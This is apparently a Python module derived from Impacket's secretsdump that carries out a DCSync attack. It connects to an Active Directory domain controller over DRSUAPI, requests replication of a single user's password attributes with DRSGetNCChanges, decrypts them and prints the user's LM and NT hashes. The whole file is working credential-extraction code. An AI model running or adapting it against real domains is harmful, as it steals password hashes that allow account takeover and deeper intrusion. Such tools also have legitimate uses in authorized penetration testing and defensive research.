# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs a single [MS-DRDS] DRSGetNCChanges() call
#   replicating just the attributes needed to retrieve
#   the targeted user hash.
#
#   Both targeted user and domain controler's NTDS-DSA
#   GUID are needed. This tool is not getting them.
#
# Author:
#  Alberto Solino (@agsolino) for original work
#  Paul Saladin (@p-alu) for minifying
#
# References:
#   https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py
#
#   """
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#   """

from __future__ import division
from __future__ import print_function
import logging
import random
from binascii import hexlify
from struct import unpack

from impacket import LOG, ntlm
from impacket import ntlm
from impacket.dcerpc.v5 import transport, samr, epm, drsuapi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.uuid import string_to_bin

try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass

class RemoteOperations:
    def __init__(self, doKerberos, remoteHost, remoteName, username, password, domain, lmhash, nthash, aesKey, useSAMR, TGT=None, TGS=None, kdcHost=None):
        self.__domainName = None

        self.__drsr = None
        self.__hDrs = None
        self.__NtdsDsaObjectGuid = None
        self.__ppartialAttrSet = None
        self.__prefixTable = []

        self.__remoteHost = remoteHost
        self.__remoteName = remoteName

        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = lmhash
        self.__nthash = nthash
        self.__aesKey = aesKey
        self.__TGT = TGT
        self.__TGS = TGS
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost

        self.__useSAMR = useSAMR


    def __connectDrds(self):
        stringBinding = epm.hept_map(self.__remoteHost, drsuapi.MSRPC_UUID_DRSUAPI,
                                     protocol='ncacn_ip_tcp')
        rpc = transport.DCERPCTransportFactory(stringBinding)
        rpc.setRemoteHost(self.__remoteHost)
        rpc.setRemoteName(self.__remoteName)

        if self.__doKerberos:
            from impacket.krb5.ccache import CCache
            self.__domain, self.__username, self.__TGT, self.__TGS = CCache.parseFile(self.__domain, self.__username, 'host/%s' % self.__remoteName)

        if hasattr(rpc, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpc.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__TGT, self.__TGS)
            rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.__drsr = rpc.get_dce_rpc()
        self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.__doKerberos:
            self.__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__drsr.connect()
        if self.__useSAMR:
            # Playing some tricks, makes the dump slower
            self.__drsr.bind(samr.MSRPC_UUID_SAMR)
            self.__drsr = self.__drsr.alter_ctx(drsuapi.MSRPC_UUID_DRSUAPI)
            self.__drsr.set_max_fragment_size(1)
        else:
            self.__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        if self.__domainName is None:
            # Get domain name from credentials cached
            self.__domainName = rpc.get_credentials()[2]

        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs) #- 4
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        drs['dwExtCaps'] = 0xffffffff
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(drs.getData())
        resp = self.__drsr.request(request)
        if LOG.level == logging.DEBUG:
            LOG.debug('DRSBind() answer')
            resp.dump()

        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
        len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            if LOG.level == logging.DEBUG:
                LOG.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
                    'dwReplEpoch'])
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = self.__drsr.request(request)

        self.__hDrs = resp['phDrs']

        self.__NtdsDsaObjectGuid = string_to_bin(self.__NtdsDsaObjectGuid)

    def getDrsr(self):
        return self.__drsr

    # Wrapper for calling _DRSGetNCChanges with a GUID
    def DRSGetNCChangesGuid(self, userGuid, NtdsDsaObjectGuid):
        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin(userGuid)
        dsName['Sid'] = ''
        dsName['NameLen'] = 0
        dsName['StringName'] = ('\x00')
        dsName['structLen'] = len(dsName.getData())

        self.__NtdsDsaObjectGuid = NtdsDsaObjectGuid
        return self._DRSGetNCChanges(userGuid, dsName)

    def _DRSGetNCChanges(self, userEntry, dsName):
        if self.__drsr is None:
            self.__connectDrds()

        LOG.debug('Calling DRSGetNCChanges for %s ' % userEntry)
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        if self.__ppartialAttrSet is None:
            self.__prefixTable = []
            self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            self.__ppartialAttrSet['dwVersion'] = 1
            self.__ppartialAttrSet['cAttrs'] = len(GetNCChanges.ATTRTYP_TO_ATTID)
            for attId in list(GetNCChanges.ATTRTYP_TO_ATTID.values()):
                self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable , attId))
        request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = self.__prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

        return self.__drsr.request(request)

    def finish(self):
        if self.__drsr is not None:
            self.__drsr.disconnect()

class GetNCChanges:
    class SECRET_TYPE:
        NTDS = 0
        NTDS_CLEARTEXT = 1
        NTDS_KERBEROS = 2

    NAME_TO_INTERNAL = {
        'uSNCreated':b'ATTq131091',
        'uSNChanged':b'ATTq131192',
        'name':b'ATTm3',
        'objectGUID':b'ATTk589826',
        'objectSid':b'ATTr589970',
        'userAccountControl':b'ATTj589832',
        'primaryGroupID':b'ATTj589922',
        'accountExpires':b'ATTq589983',
        'logonCount':b'ATTj589993',
        'sAMAccountName':b'ATTm590045',
        'sAMAccountType':b'ATTj590126',
        'lastLogonTimestamp':b'ATTq589876',
        'userPrincipalName':b'ATTm590480',
        'unicodePwd':b'ATTk589914',
        'dBCSPwd':b'ATTk589879',
        'ntPwdHistory':b'ATTk589918',
        'lmPwdHistory':b'ATTk589984',
        'pekList':b'ATTk590689',
        'supplementalCredentials':b'ATTk589949',
        'pwdLastSet':b'ATTq589920',
        'instanceType':b'ATTj131073',
    }

    NAME_TO_ATTRTYP = {
        'userPrincipalName': 0x90290,
        'sAMAccountName': 0x900DD,
        'unicodePwd': 0x9005A,
        'dBCSPwd': 0x90037,
        'ntPwdHistory': 0x9005E,
        'lmPwdHistory': 0x900A0,
        'supplementalCredentials': 0x9007D,
        'objectSid': 0x90092,
        'userAccountControl':0x90008,
    }

    ATTRTYP_TO_ATTID = {
        'userPrincipalName': '1.2.840.113556.1.4.656',
        'sAMAccountName': '1.2.840.113556.1.4.221',
        'unicodePwd': '1.2.840.113556.1.4.90',
        'dBCSPwd': '1.2.840.113556.1.4.55',
        'ntPwdHistory': '1.2.840.113556.1.4.94',
        'lmPwdHistory': '1.2.840.113556.1.4.160',
        'supplementalCredentials': '1.2.840.113556.1.4.125',
        'objectSid': '1.2.840.113556.1.4.146',
        'pwdLastSet': '1.2.840.113556.1.4.96',
        'userAccountControl':'1.2.840.113556.1.4.8',
    }

    def __init__(self, userGUID, NTDSDSAObjectGUID, remoteOps, perSecretCallback = lambda secretType, secret : _print_helper(secret)):
        self.__remoteOps = remoteOps
        self.__userGUID = userGUID
        self.__NTDSDSAObjectGUID = NTDSDSAObjectGUID
        self.__perSecretCallback = perSecretCallback

		# these are all the columns that we need to get the secrets.
		# If in the future someone finds other columns containing interesting things please extend ths table.
        self.__filter_tables_usersecret = {
            self.NAME_TO_INTERNAL['objectSid'] : 1,
            self.NAME_TO_INTERNAL['dBCSPwd'] : 1,
            self.NAME_TO_INTERNAL['name'] : 1,
            self.NAME_TO_INTERNAL['sAMAccountType'] : 1,
            self.NAME_TO_INTERNAL['unicodePwd'] : 1,
            self.NAME_TO_INTERNAL['sAMAccountName'] : 1,
            self.NAME_TO_INTERNAL['userPrincipalName'] : 1,
            self.NAME_TO_INTERNAL['ntPwdHistory'] : 1,
            self.NAME_TO_INTERNAL['lmPwdHistory'] : 1,
            self.NAME_TO_INTERNAL['pwdLastSet'] : 1,
            self.NAME_TO_INTERNAL['userAccountControl'] : 1,
            self.NAME_TO_INTERNAL['supplementalCredentials'] : 1,
            self.NAME_TO_INTERNAL['pekList'] : 1,
            self.NAME_TO_INTERNAL['instanceType'] : 1,

        }

    def __decryptHash(self, record, prefixTable=None, outputFile=None):
        LOG.debug('Entering GetNCChanges.__decryptHash')
        replyVersion = 'V%d' %record['pdwOutVersion']
        LOG.debug('Decrypting hash for user: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
        domain = None

        rid = unpack('<L', record['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]

        for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
            except Exception as e:
                LOG.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                LOG.debug('Exception', exc_info=True)
                # Fallbacking to fixed table and hope for the best
                attId = attr['attrTyp']
                LOOKUP_TABLE = self.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE['dBCSPwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encrypteddBCSPwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedLMHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encrypteddBCSPwd)
                    LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                else:
                    LMHash = ntlm.LMOWFv1('', '')
            elif attId == LOOKUP_TABLE['unicodePwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedNTHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedUnicodePwd)
                    NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                else:
                    NTHash = ntlm.NTOWFv1('', '')
            elif attId == LOOKUP_TABLE['userPrincipalName']:
                if attr['AttrVal']['valCount'] > 0:
                    try:
                        domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                    except:
                        domain = None
                else:
                    domain = None
            elif attId == LOOKUP_TABLE['sAMAccountName']:
                if attr['AttrVal']['valCount'] > 0:
                    try:
                        userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                    except:
                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        userName = 'unknown'
                else:
                    LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    userName = 'unknown'
            elif attId == LOOKUP_TABLE['objectSid']:
                if attr['AttrVal']['valCount'] > 0:
                    objectSid = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                else:
                    LOG.error('Cannot get objectSid for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    objectSid = rid
            elif attId == LOOKUP_TABLE['pwdLastSet']:
                pass

        if domain is not None:
            userName = '%s\\%s' % (domain, userName)

        answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash).decode('utf-8'), hexlify(NTHash).decode('utf-8'))
        self.__perSecretCallback(GetNCChanges.SECRET_TYPE.NTDS, answer)

        LOG.debug('Leaving GetNCChanges.__decryptHash')

    def dump(self):
        LOG.info('Using the DRSUAPI method to get NTDS.DIT secrets')
        userRecord = self.__remoteOps.DRSGetNCChangesGuid(self.__userGUID, self.__NTDSDSAObjectGUID)
        #userRecord.dump()
        replyVersion = 'V%d' % userRecord['pdwOutVersion']
        if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
            raise Exception('DRSGetNCChanges didn\'t return any object!')
        try:
            self.__decryptHash(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
            self.__remoteOps.finish()
        except Exception as e:
            LOG.error("Error while processing user!")
            LOG.debug("Exception", exc_info=True)
            LOG.error(str(e))

def _print_helper(*args, **kwargs):
    print(args[-1])
